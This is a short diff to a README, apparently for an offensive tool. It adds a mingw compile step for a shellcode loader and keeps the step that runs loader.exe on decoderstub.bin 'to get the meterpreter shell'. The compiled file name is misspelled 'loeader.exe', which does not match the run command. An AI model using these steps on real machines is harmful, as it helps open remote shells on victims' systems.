@@ -79,7 +79,12 @@ void go()
 ./compile.sh
 ```
 
-* Run loader to get the meterpreter shell.
+* Compile and run the loader to get the meterpreter shell.
+
+```
+x86_64-w64-mingw32-gcc loader.c -o loeader.exe
+```
+
 ```
 .\loader.exe .\decoderstub.bin
 ```
